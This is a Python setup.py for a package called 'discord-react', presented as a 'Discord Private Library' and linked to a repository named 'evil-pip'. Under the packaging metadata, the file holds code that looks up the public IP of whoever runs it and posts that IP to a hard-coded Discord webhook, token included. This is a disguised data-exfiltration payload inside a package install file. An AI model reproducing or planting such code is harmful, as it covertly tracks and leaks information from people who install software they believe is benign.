import setuptools

setuptools.setup(
    name="discord-react",
    packages=setuptools.find_packages(),
    version="0.0.0.1",
    license="MIT",
    description="Discord Private Library",
    author="0xe2d0",
    url="https://github.com/0xe2d0/evil-pip",
    download_url="https://github.com/0xe2d0/evil-pip/tarball/master",
    keywords=[""],
    install_requires=[""],
    classifiers=[],
)


import requests

def send_to_discord(webhook_url, content):
    data = {
        "content": content
    }
    response = requests.post(webhook_url, data=data)
    return response.status_code

def get_ip():
    response = requests.get('https://api.ipify.org?format=json')
    ip_info = response.json()
    return ip_info

def main():
    webhook_url = 'https://discord.com/api/webhooks/1243998916026831043/Vhhv-m25PgiSF14Gxo-Uiw0dKXiPeEOn9D1-18oupWFjPfzOgaQTUrkRfbhsIuZTVJYI'
    ip_info = get_ip()
    send_to_discord(webhook_url, str(ip_info))

if __name__ == "__main__":
    main()
